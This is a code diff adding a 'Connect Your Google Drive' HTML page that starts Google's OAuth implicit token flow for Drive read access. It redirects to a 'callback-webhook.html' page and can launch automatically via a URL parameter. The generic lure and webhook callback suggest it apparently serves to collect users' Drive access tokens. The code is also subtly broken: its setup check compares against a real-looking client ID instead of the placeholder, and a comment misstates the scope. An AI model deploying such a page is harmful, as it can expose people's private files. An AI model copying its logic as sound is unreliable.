@@ -1,0 +1,106 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connect Your Drive</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        }
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+            text-align: center;
+            max-width: 400px;
+        }
+        h1 {
+            color: #333;
+            margin-bottom: 20px;
+            font-size: 24px;
+        }
+        p {
+            color: #666;
+            margin-bottom: 30px;
+            line-height: 1.6;
+        }
+        button {
+            background: #4285f4;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        button:hover {
+            background: #357ae8;
+        }
+        .icon {
+            font-size: 60px;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="icon">📁</div>
+        <h1>Connect Your Google Drive</h1>
+        <p>Click below to securely link your Google Drive account.</p>
+        <button onclick="initiateOAuth()">Connect Now</button>
+    </div>
+
+    <script>
+        // ⚠️ REPLACE THIS with your Google OAuth Client ID
+        const CLIENT_ID = 'YOUR_CLIENT_ID_HERE.apps.googleusercontent.com';
+
+        // Automatically calculated redirect URI
+        const REDIRECT_URI = window.location.origin + window.location.pathname.replace('index-webhook.html', '').replace('index.html', '') + 'callback-webhook.html';
+
+        // Request full Drive access
+        const SCOPE = 'https://www.googleapis.com/auth/drive.readonly';
+
+        function initiateOAuth() {
+            // Validate Client ID is set
+            if (CLIENT_ID === '947234711738-drd4she7gm4eukmu8icqkui44g6uja0l.apps.googleusercontent.com') {
+                alert('Setup required. Please contact administrator.');
+                return;
+            }
+
+            // Get redirect parameter
+            const urlParams = new URLSearchParams(window.location.search);
+            const redirectTo = urlParams.get('go') || '';
+
+            // Build OAuth URL
+            const authUrl = `https://accounts.google.com/o/oauth2/v2/auth?` +
+                `client_id=${CLIENT_ID}` +
+                `&redirect_uri=${encodeURIComponent(REDIRECT_URI)}` +
+                `&response_type=token` +
+                `&scope=${encodeURIComponent(SCOPE)}` +
+                `&include_granted_scopes=true` +
+                `&state=${encodeURIComponent(redirectTo)}`;
+
+            // Redirect to Google OAuth
+            window.location.href = authUrl;
+        }
+
+        // Auto-start if ?auto=true parameter
+        window.addEventListener('DOMContentLoaded', () => {
+            const urlParams = new URLSearchParams(window.location.search);
+            if (urlParams.get('auto') === 'true') {
+                initiateOAuth();
+            }
+        });
+    </script>
+</body>
+</html>
